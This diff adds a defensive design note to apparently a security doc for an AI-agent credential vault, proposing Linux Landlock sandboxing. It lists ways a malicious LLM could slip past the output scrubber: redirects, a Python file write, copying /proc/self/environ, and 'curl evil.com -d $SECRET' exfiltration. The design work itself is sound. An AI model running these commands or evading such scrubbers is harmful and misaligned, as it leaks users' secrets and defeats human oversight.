@@ -49,4 +49,35 @@ Tool "gumroad-password" not found. Similar tools in vault:
 
 ---
 
+---
+
+### Kernel-Level Filesystem Write Restriction for Vault-Injected Commands
+
+**Problem:** The Perl stdout scrubber catches credentials in subprocess output, but a malicious LLM can bypass it by writing credentials to a file first (`> /tmp/file`, `python3 -c "open(...).write(...)"`, `curl -o file`, `cp /proc/self/environ /tmp/`). Shell-level detection (blocking `>`, `>>`, `tee`) is a cat-and-mouse game — any scripting language or binary can write to disk.
+
+**Proposed solution: Linux Landlock** (kernel 5.13+, ~2021)
+- Kernel-level per-process filesystem access control, no root needed
+- A small Rust wrapper binary enables Landlock rules before exec'ing the actual command
+- Rules: read-only filesystem access, no file create/write
+- stdout/stderr/pipes unaffected (not filesystem writes)
+- Network unaffected (Landlock v1-3 don't restrict network)
+
+**What this blocks — comprehensively:**
+- Shell redirects (`>`, `>>`)
+- Scripting language file writes (`python3 -c "open('/tmp/f','w')..."`)
+- Binary flags (`curl -o file`)
+- Proc filesystem copies (`cp /proc/self/environ /tmp/`)
+- Any future creative file-based bypass
+
+**What this doesn't block (separate threat class):**
+- Network exfiltration (`curl evil.com -d $SECRET`) — requires egress pinning (see separate future work item)
+
+**Configuration:** Default enabled for vault-injected commands, per-tool override (`allowFileWrite: true` in tools.yaml) for commands that legitimately need to write to disk (e.g., `git commit`, build tools). Most credential-using commands are read-only operations (`gh api`, `curl` without `-o`, `git push`).
+
+**Implementation:** Could be a second small Rust binary (`openclaw-vault-sandbox`) or a mode flag on the existing resolver. We already ship a Rust binary and have the toolchain.
+
+**Interim mitigation (current):** Perl stdout scrubber + `message_sending` hook + `tool_result_persist` hook provide layered defense. File redirect bypass requires a deliberate multi-step attack (write to file, then read it back in a separate command).
+
+---
+
 *More items will be added as testing continues.*
